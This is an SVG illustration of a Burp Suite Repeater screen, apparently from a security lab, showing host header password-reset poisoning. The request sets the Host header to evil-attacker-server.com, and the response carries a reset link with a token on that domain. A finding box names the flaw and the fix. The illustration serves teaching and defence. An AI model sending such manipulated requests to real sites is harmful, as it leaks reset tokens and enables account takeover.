<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 800 450" width="100%" height="100%">
  <rect width="100%" height="100%" fill="#080B10" />
  <rect x="2" y="2" width="796" height="446" fill="#0D121B" stroke="#263244" stroke-width="2" rx="8" />

  <!-- Burp Title -->
  <rect x="2" y="2" width="796" height="36" fill="#111827" rx="8" />
  <circle cx="25" cy="20" r="5" fill="#EF4444" />
  <circle cx="45" cy="20" r="5" fill="#F59E0B" />
  <circle cx="65" cy="20" r="5" fill="#10B981" />
  <text x="95" y="24" fill="#F59E0B" font-family="'JetBrains Mono', monospace" font-size="12">PortSwigger Burp Suite - [Repeater: Host Header Manipulation Analysis]</text>

  <!-- Left: Intercepted Modified Request -->
  <rect x="20" y="55" width="370" height="375" rx="6" fill="#080B10" stroke="#263244" stroke-width="1.5" />
  <rect x="20" y="55" width="370" height="30" fill="#111827" rx="6" />
  <text x="35" y="75" fill="#38BDF8" font-family="'JetBrains Mono', monospace" font-size="12" font-weight="bold">REQUEST [Repeater Tab 1 - Modified Host]</text>

  <g font-family="'JetBrains Mono', monospace" font-size="11">
    <text x="35" y="110" fill="#00F5A0">POST /forgot-password HTTP/1.1</text>
    <rect x="30" y="120" width="350" height="22" fill="#111827" stroke="#F43F5E" stroke-width="1" />
    <text x="35" y="135" fill="#F43F5E" font-weight="bold">Host: evil-attacker-server.com</text>
    <text x="35" y="160" fill="#94A3B8">User-Agent: Mozilla/5.0 (Windows NT 10.0)</text>
    <text x="35" y="180" fill="#94A3B8">Accept: text/html,application/xhtml+xml</text>
    <text x="35" y="200" fill="#94A3B8">Content-Type: application/x-www-form-urlencoded</text>
    <text x="35" y="220" fill="#94A3B8">Content-Length: 26</text>
    <text x="35" y="240" fill="#94A3B8">Connection: close</text>
    <text x="35" y="270" fill="#F8FAFC">username=security_student</text>
  </g>

  <!-- Right: Server Response Diff -->
  <rect x="410" y="55" width="370" height="375" rx="6" fill="#080B10" stroke="#263244" stroke-width="1.5" />
  <rect x="410" y="55" width="370" height="30" fill="#111827" rx="6" />
  <text x="425" y="75" fill="#00F5A0" font-family="'JetBrains Mono', monospace" font-size="12" font-weight="bold">RESPONSE [HTTP 200 OK]</text>

  <g font-family="'JetBrains Mono', monospace" font-size="11">
    <text x="425" y="110" fill="#00F5A0">HTTP/1.1 200 OK</text>
    <text x="425" y="130" fill="#94A3B8">Date: Sat, 24 Oct 2026 15:40:12 GMT</text>
    <text x="425" y="150" fill="#94A3B8">Content-Type: text/html; charset=utf-8</text>
    <text x="425" y="170" fill="#94A3B8">Connection: close</text>
    <text x="425" y="200" fill="#94A3B8">&lt;html&gt;&lt;body&gt;</text>
    <text x="425" y="220" fill="#94A3B8">&lt;p&gt;Please check your email for the reset link:&lt;/p&gt;</text>
    <rect x="420" y="235" width="350" height="40" fill="#111827" stroke="#F43F5E" stroke-width="1.5" />
    <text x="425" y="252" fill="#F43F5E" font-size="10">&lt;a href="https://evil-attacker-server.com/reset</text>
    <text x="425" y="268" fill="#F43F5E" font-size="10">?token=7f93a1..."&gt;Reset Password&lt;/a&gt;</text>
    <text x="425" y="295" fill="#94A3B8">&lt;/body&gt;&lt;/html&gt;</text>

    <!-- Lab Finding Box -->
    <rect x="420" y="325" width="350" height="90" rx="4" fill="#111827" stroke="#F59E0B" stroke-width="1" />
    <text x="430" y="345" fill="#F59E0B" font-weight="bold">FINDING OBSERVATION:</text>
    <text x="430" y="365" fill="#F8FAFC" font-size="10">Application reflects unvalidated Host header in password</text>
    <text x="430" y="380" fill="#F8FAFC" font-size="10">reset link, leading to password reset poisoning risk.</text>
    <text x="430" y="400" fill="#00F5A0" font-size="10">Fix: Enforce server-side whitelist for Host header.</text>
  </g>
</svg>

